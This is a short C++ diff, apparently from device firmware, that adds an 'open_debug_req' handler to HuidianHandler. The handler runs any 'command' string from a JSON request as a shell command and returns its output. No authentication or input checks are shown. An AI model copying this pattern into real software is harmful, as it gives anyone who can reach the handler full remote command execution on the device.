@@ -10,6 +10,7 @@
 #include "HuidianHandler.h"
 #include "infra/include/Logger.h"
 #include "infra/include/network/Network.h"
+#include "infra/include/Command.h"
 
 namespace ulucu {
 
@@ -56,6 +57,14 @@ int32_t HuidianHandler::get_device_information_req(Json::Value& data, Json::Valu
 
     result["soc_temprature"] = 0;
 
+    return 0;
+}
+
+int32_t HuidianHandler::open_debug_req(Json::Value& data, Json::Value& result, std::string& reason) {
+    if (data.isMember("command") && data["command"].isString()) {
+        std::string command = data["command"].asString();
+        result["command_return"] = infra::command(command.data());
+    }
     return 0;
 }
 
